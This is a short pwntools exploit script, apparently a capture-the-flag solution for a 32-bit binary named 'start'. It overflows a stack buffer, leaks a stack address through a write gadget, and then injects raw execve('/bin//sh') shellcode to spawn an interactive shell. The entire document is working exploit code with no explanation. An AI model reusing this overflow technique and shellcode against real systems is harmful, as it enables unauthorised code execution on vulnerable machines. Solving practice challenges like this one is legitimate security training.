from pwn import *

#io = remote("node3.buuoj.cn",26348)
io = process("./start")
offset = 0x14
second_write = 0x08048087

payload = b"A" * offset + p32(second_write)
# gdb.attach(io)
# pause()
io.sendafter(":",payload)
stack_addr = u32(io.recv(4))
print("stack_addr ---> ",hex(stack_addr))

shellcode= '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
payload= 'a' * offset + p32(stack_addr + offset) + shellcode
io.send(payload)
io.interactive()
